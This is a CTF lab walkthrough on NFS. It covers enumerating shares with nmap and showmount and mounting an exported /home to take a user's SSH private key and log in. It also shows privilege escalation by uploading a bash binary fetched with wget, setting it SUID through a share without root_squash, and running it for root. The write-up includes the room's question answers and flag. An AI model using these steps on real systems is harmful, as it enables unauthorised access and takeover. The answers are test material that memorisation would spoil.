# Network Services part 2

## NFS

What is NFS?

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

How does NFS work?

Computer network - Vector stencils library | Computers ...

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

     The file handle
     The name of the file to be accessed
     The user's, user ID
     The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

What runs NFS?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

More Information:

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

https://www.datto.com/library/what-is-nfs-file-share

http://nfs.sourceforge.net/

https://wiki.archlinux.org/index.php/NFS

### Enumerating NFS

NFS-Common

It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: https://packages.ubuntu.com/jammy/nfs-common.

Mounting NFS shares

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

sudo mount -t nfs IP:share /tmp/mount/ -nolock

Let's break this down
	
Tag 	Function
sudo 	Run as root
mount 	Execute the mount command
-t nfs 	Type of device to mount, then specifying that it's NFS
IP:share 	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock 	Specifies not to use NLM locking

1st scan on target:
```
nmap -sT -A -p- 10.10.255.89    
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 14:19 GMT
Nmap scan report for 10.10.255.89
Host is up (0.011s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 73928e04de40fb9c90f9cf4270c845a7 (RSA)
|   256 6d63d6b80a67fd86f122302b2d271eff (ECDSA)
|_  256 bd089779630f807c7fe850dc59cf395e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38763/udp6  mountd
|   100005  1,2,3      41237/udp   mountd
|   100005  1,2,3      54099/tcp6  mountd
|   100005  1,2,3      60395/tcp   mountd
|   100021  1,3,4      32841/tcp6  nlockmgr
|   100021  1,3,4      34657/udp6  nlockmgr
|   100021  1,3,4      46585/tcp   nlockmgr
|   100021  1,3,4      60082/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
46585/tcp open  nlockmgr 1-4 (RPC #100021)
49193/tcp open  mountd   1-3 (RPC #100005)
50339/tcp open  mountd   1-3 (RPC #100005)
60395/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds
```

List visible shares
```
usr/sbin/showmount -e 10.10.255.89
Export list for 10.10.255.89:
/home *
```

Mount share on local machine: 
`sudo mount -t nfs 10.10.255.89:/home /tmp/mount -nolock` 

found dir `cappucino` which looks like a home dir

found .ssh dir with id_rsa key

copied key to local machine, chmod 600

logged into machine with key and username `cappucino`

### Questions

How many ports open? 7

What port contains the service we're enumerating? 2049 

Name of visible share? /home

Folder name? cappucino

Folder that could give remote sccess? .ssh

Most useful key? id_rsa 

Can we login using ssh -i <key-file> <username>@<IP>? yes

### Exploiting NFS

We're done, right?

Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

What is root_squash?

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.
SUID

So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

Method

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

The Executable

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it here. If you want to download it via the command line, be careful not to download the github page instead of the raw script. You can use wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash.

Mapped Out Pathway:

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:

    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS

What letter do we use to set SUID with chmod? +s

What permissions does the bash executable have? -rwsr-sr-x

Can we execute bash as root(./bash -p)? yes

Flag? THM{nfs_got_pwned}

